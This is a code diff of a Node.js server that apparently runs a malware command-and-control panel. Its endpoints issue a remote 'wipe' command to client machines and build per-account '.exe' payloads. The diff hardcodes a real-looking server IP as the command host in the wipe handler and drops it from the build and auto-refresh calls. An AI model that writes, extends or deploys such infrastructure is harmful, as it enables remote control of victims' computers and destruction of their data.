@@ -585,11 +585,7 @@ app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
     }
   }
 
-  let base = req.body?.serverBase;
-  if (!base) {
-    // HARDCODED IP
-    base = 'http://95.182.96.216';
-  }
+  const base = 'http://95.182.96.216'; // HARDCODED
 
   const line = buildWipeCommand(base);
 
@@ -858,11 +854,8 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
   try {
     const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
     const nextBuildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;
-    
-    // HARDCODED IP
-    const serverBase = `http://95.182.96.216`;
 
-    zipBuf = await buildBoot({ key: buildKey, buildId: nextBuildId, serverIp: serverBase });
+    zipBuf = await buildBoot({ key: buildKey, buildId: nextBuildId });
   } catch (e) {
     console.error('[build] failed:', e);
     const msg = (e.stderr || e.message || 'unknown').toString().slice(-3000);
@@ -1094,10 +1087,7 @@ async function refreshAllBuilds() {
 
         console.log(`[auto-refresh] user ${uid} build ${latest.id}...`);
         
-        // HARDCODED IP
-        const serverBase = `http://95.182.96.216`;
-        
-        const exeBuf = await buildBoot({ key: latest.key || u.account_key, buildId: latest.id, serverIp: serverBase });
+        const exeBuf = await buildBoot({ key: latest.key || u.account_key, buildId: latest.id });
         const exeName = `build_${Date.now()}_u${uid}.exe`;
         fs.writeFileSync(path.join(BUILD_DIR, exeName), exeBuf, { mode: 0o644 });
 
